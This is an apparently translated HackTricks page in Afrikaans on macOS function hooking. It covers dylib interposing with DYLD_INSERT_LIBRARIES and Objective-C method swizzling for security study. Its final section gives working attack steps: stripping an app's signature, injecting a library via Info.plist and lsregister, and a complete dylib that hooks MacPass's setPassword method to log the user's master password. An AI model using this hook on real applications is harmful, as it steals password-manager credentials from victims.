# macOS Function Hooking

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Funksie Interposing

Skep 'n **dylib** met 'n **`__interpose`**-afdeling (of 'n afdeling wat gemerk is met **`S_INTERPOSING`**) wat tuples van **funksie-aanwysers** bevat wat verwys na die **oorspronklike** en die **vervangings**-funksies.

Injecteer dan die dylib met **`DYLD_INSERT_LIBRARIES`** (die interposing moet plaasvind voordat die hoofprogram laai). Uiteraard geld die [**beperkings** wat op die gebruik van **`DYLD_INSERT_LIBRARIES`** van toepassing is, ook hier](macos-library-injection/#check-restrictions).

### Interpose printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

// Function pointer type for the original function
typedef int (*orig_open_type)(const char *pathname, int flags);

// Function pointer type for the interposed function
typedef int (*interposed_open_type)(const char *pathname, int flags);

// Define the interposed function
int interposed_open(const char *pathname, int flags) {
    printf("Interposed open called with pathname: %s\n", pathname);
    
    // Get the address of the original function
    orig_open_type orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    
    // Call the original function
    int result = orig_open(pathname, flags);
    
    return result;
}

// Define the constructor function
__attribute__((constructor))
void my_constructor() {
    printf("Constructor called\n");
    
    // Get the address of the interposed function
    interposed_open_type interposed_open = (interposed_open_type)dlsym(RTLD_NEXT, "open");
    
    // Get the address of the original function
    orig_open_type orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    
    // Call the interposed function
    interposed_open("file.txt", 0);
    
    // Call the original function
    orig_open("file.txt", 0);
}
```

This code demonstrates how to use function hooking in macOS using the `interpose` mechanism. The `interpose` mechanism allows you to intercept and replace function calls at runtime.

In this example, we define an interposed function called `interposed_open` that will be called instead of the original `open` function. The `interposed_open` function simply prints the pathname argument and then calls the original `open` function.

To use the `interpose` mechanism, we need to define a constructor function called `my_constructor`. The constructor function is automatically called when the shared library is loaded. In the constructor function, we get the addresses of both the interposed and original `open` functions using `dlsym`. We then call the interposed function to demonstrate that it is being called instead of the original function. Finally, we call the original function to show that we can still call it if needed.

To compile and use this code, you can use the following commands:

```bash
gcc -shared -o interpose.dylib interpose.c -ldl
DYLD_INSERT_LIBRARIES=./interpose.dylib ./program
```

Replace `program` with the name of the program you want to run with the interposed function.

When you run the program, you should see the output from the interposed function followed by the output from the original function.

This technique can be useful for various purposes, such as logging function calls, modifying function behavior, or implementing security measures.

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## Metode Swizzling

In ObjectiveC word 'n metode soos volg geroep: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Die **objek**, die **metode** en die **parameters** is nodig. En wanneer 'n metode geroep word, word 'n **boodskap gestuur** deur die gebruik van die funksie **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Die objek is **`someObject`**, die metode is **`@selector(method1p1:p2:)`** en die argumente is **value1**, **value2**.

Deur die objekstrukture te volg, is dit moontlik om 'n **array van metodes** te bereik waar die **name** en **pointer** na die metodekode **geleë** is.

{% hint style="danger" %}
Let daarop dat omdat metodes en klasse gebaseer word op hul name, hierdie inligting in die binêre lêer gestoor word, so dit is moontlik om dit te herwin met `otool -ov </path/bin>` of [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Toegang tot die rou metodes

Dit is moontlik om die inligting van die metodes soos naam, aantal parameters of adres te bekom, soos in die volgende voorbeeld:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### Metode Swizzling met method\_exchangeImplementations

Die funksie **`method_exchangeImplementations`** maak dit moontlik om die **adres** van die **implementering** van een funksie te **verander** na die ander.

{% hint style="danger" %}
Dus, wanneer 'n funksie geroep word, word die ander een **uitgevoer**.
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
In hierdie geval, as die **implementasie-kode van die regmatige** metode die **metode-naam** **verifieer**, kan dit hierdie swizzling opspoor en voorkom dat dit uitgevoer word.

Die volgende tegniek het nie hierdie beperking nie.
{% endhint %}

### Metode Swizzling met method\_setImplementation

Die vorige formaat is vreemd omdat jy die implementasie van 2 metodes verander, een van die ander. Deur die funksie **`method_setImplementation`** te gebruik, kan jy die implementasie van 'n metode **verander vir die ander**.

Onthou net om die adres van die implementasie van die oorspronklike een te **stoor** as jy dit van die nuwe implementasie gaan oproep voordat jy dit oorskryf, want later sal dit baie moeilik wees om daardie adres te vind.

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## Hooking Aanval Metodologie

Op hierdie bladsy is verskillende maniere bespreek om funksies te haker. Dit betrek egter **die uitvoering van kode binne die proses om aan te val**.

Om dit te doen, is die maklikste tegniek om 'n [Dyld via omgewingsveranderlikes of kaping](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md) in te spuit. Ek vermoed egter dat dit ook gedoen kan word deur [Dylib-prosesinjeksie](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Beide opsies is egter **beperk** tot **onbeskermde** binnerwerke/prosesse. Kyk na elke tegniek om meer te leer oor die beperkings.

'n Funksie-hakeraanval is egter baie spesifiek, 'n aanvaller sal dit doen om **gevoelige inligting uit 'n proses te steel** (as jy nie dit sou doen nie, sou jy net 'n prosesinjeksie-aanval doen). En hierdie gevoelige inligting kan in gebruikers afgelaaide programme soos MacPass wees.

Die aanvaller se vektor sou dus wees om óf 'n kwesbaarheid te vind óf die handtekening van die toepassing te verwyder, die **`DYLD_INSERT_LIBRARIES`** omgewingsveranderlike deur die Info.plist van die toepassing in te spuit en iets soos die volgende by te voeg:

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

en registreer dan die toepassing **weer**:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Voeg in daardie biblioteek die hooking-kode by om die inligting uit te skakel: Wagwoorde, boodskappe...

{% hint style="danger" %}
Let daarop dat in nuwer weergawes van macOS, as jy die handtekening van die toepassingsbinêre lêer **verwyder** en dit voorheen uitgevoer is, sal macOS die toepassing **nie meer uitvoer nie**.
{% endhint %}

#### Biblioteekvoorbeeld

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## Verwysings

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hack-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
